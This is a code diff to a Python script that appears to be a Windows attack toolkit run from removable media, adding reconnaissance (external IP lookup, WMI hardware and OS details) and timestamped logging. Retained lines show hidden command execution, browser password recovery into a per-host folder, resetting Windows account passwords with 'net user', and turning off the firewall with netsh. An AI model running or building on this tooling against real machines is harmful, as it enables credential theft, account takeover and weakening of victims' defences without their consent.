@@ -1,4 +1,4 @@
-import os, sys, ctypes, getpass, socket, subprocess
+import os, sys, ctypes, getpass, socket, subprocess, urllib.request, math, wmi, platform, datetime
 exec(open("config.py").read())
 
 si = subprocess.STARTUPINFO()
@@ -23,8 +23,15 @@ elif duplicate_exec:
             usr_ct += 1
 else:
     sys.exit()
-
-rootdir = "..\hosts\\" + root + "\\"
+rootdir = "..\\hosts\\" + root + "\\"
+os.chdir("payloads")
+# logging start
+if logging:
+    fl = open(rootdir+"Log.txt", "w")
+    d = datetime.datetime.now()
+    logstart = d.strftime(r"%d-%m-%Y at %I:%M %p")
+    fl.write("Started on: " + logstart)
+    fl.close()
 
 
 # checking internet connectivity
@@ -35,7 +42,6 @@ except OSError:
     pass
     inet = 0
 
-os.chdir("payloads")
 # password recovery
 if browser_pwds:
     p = rootdir + "Browser passwords.html"
@@ -74,9 +80,9 @@ if change_nt_pwd["diff_acc_controller"]:
     subprocess.call("cmd /c net user "+'"'+xusr+'" '+'"'+xpwd+'"', startupinfo=si)
 
 # Network based executions
-if deactivate_firewall:
+if disable_firewall:
     subprocess.call("netsh advfirewall set allprofiles state off", startupinfo=si)
-if activate_firewall:
+if enable_firewall:
     subprocess.call("netsh advfirewall set allprofiles state on", startupinfo=si)
 if release_net_adapters:
     subprocess.call("ipconfig /release", startupinfo=si)
@@ -87,8 +93,55 @@ if flush_dns:
 if register_dns:
     subprocess.call("ipconfig /registerdns", startupinfo=si)
 
-if batch_info:
-    subprocess.call(["bi.bat", root, rootdir], startupinfo=si)
+# Recon
+if batch_recon:
+    if inet:
+        ext_ip = urllib.request.urlopen("https://api.ipify.org/").read()
+        ip = str(ext_ip)
+    else:
+        ip = "N/A"
+    inet = str(inet)
+    subprocess.call(["br.bat", root, rootdir, inet, ip], startupinfo=si)
+if sysinfo:
+    c = wmi.WMI()    
+    sysinfo = c.Win32_ComputerSystem()[0]
+    osinfo = c.Win32_OperatingSystem()[0]
+    cpuinfo = c.Win32_Processor()[0]
+    hddinfo = c.Win32_LogicalDisk()[0]
+    raminfo = c.Win32_PhysicalMemory()[0]
+
+    manufacturer = sysinfo.Manufacturer
+    model = sysinfo.Model
+    ramtotal = int(sysinfo.TotalPhysicalMemory)
+    hddtotal = int(hddinfo.size)
+    ramsize = round(ramtotal / 1024 / 1024 / 1024)
+    hddsize = round(hddtotal / 1024 / 1024 / 1024)
+    fh = open(rootdir+"System information.txt", "w")
+    fh.write("Primary recon:\n===============================\n\n")
+    fh.write("Model: " + manufacturer + " " + model+"\n")
+    fh.write("HDD: " + str(hddsize) + " GB"+"\n")
+    fh.write("RAM: " + str(ramsize) + " GB"+"\n")
+    fh.write("CPU: " + cpuinfo.name+"\n")
+    fh.write("OS: " + osinfo.caption+"\n")
+    fh.write("\nPlatform recon:\n===============================\n\n")
+    fh.write("Machine: " + platform.machine()+"\n")
+    fh.write("Hostname: " + platform.node()+"\n")
+    fh.write("Platform: " + platform.platform()+"\n")
+    fh.write("Processor: " + platform.processor()+"\n")
+    fh.write("Release: " + platform.release()+"\n")
+    fh.write("Version: " + platform.version()+"\n")
+    fh.write("System: " + platform.system()+"\n")
+    fh.write("System alias: " + str(platform.system_alias(platform.system(), platform.release(), platform.version()))+"\n")
+    fh.write("Uname: " + str(platform.uname())+"\n")
+    fh.close()
+
+# logging end
+if logging:
+    fl = open(rootdir+"Log.txt", "a")
+    logend = d.strftime(r"%d-%m-%Y at %I:%M %p")
+    fl.write("\n\nFinished on: " + logend)
+    fl.close()
+
 
 # msg box
 if msgbox["controller"]:
